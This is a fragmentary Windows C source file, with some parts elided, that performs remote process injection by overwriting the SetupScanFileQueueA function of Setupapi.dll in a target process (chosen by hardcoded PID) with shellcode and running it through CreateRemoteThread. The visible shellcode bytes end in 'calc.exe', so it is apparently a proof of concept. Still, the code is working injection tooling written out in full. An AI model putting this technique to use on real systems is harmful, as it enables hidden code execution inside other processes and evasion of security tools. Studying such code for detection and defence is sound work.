...
#define DLL "Setupapi.dll"
#define sacfunc "SetupScanFileQueueA"



BOOL writefuncttothememory(HANDLE hprocess,PVOID paddress,SIZE_T szshellcode,unsigned char* pshellcode) {

	DWORD oldprotection = NULL;
	if(!VirtualProtectEx(hprocess, paddress, szshellcode, PAGE_READWRITE, &oldprotection) ){
		printf("virtual protect failed with error no %d\n", GetLastError());
		return FALSE;
	}

	SIZE_T noofbyteswriteen;

	if (WriteProcessMemory(hprocess, paddress, pshellcode, szshellcode, &noofbyteswriteen) == 0 || noofbyteswriteen != szshellcode) {
		printf("writeprocess memory failed with error no %d\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hprocess, paddress, szshellcode, PAGE_EXECUTE_READ, &oldprotection)) {
		printf("virtual protect3 failed with error no %d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
...
, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00};
	...
	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 28768);

	if (hprocess == NULL) {
		printf("The process failed with error no %d", GetLastError());
	}


	PVOID paddress = GetProcAddress(LoadLibraryA(DLL), sacfunc);

	if (paddress == NULL) {
		printf("The getprocaddress fialed with error no %d\n", GetLastError());
	}

	printf("The setup dll address is 0x%p\n", paddress);
	getchar();

	if (!writefuncttothememory(hprocess, paddress, szshellcode, pshellcode)) {
		printf("ok the writefuncttothememory failed");
	}


	HANDLE hthread = CreateRemoteThread(hprocess, NULL, NULL, paddress, NULL, NULL, NULL);

	if (hthread == NULL) {
		printf("the createremote therad failed with error no %d\n", GetLastError());
	}
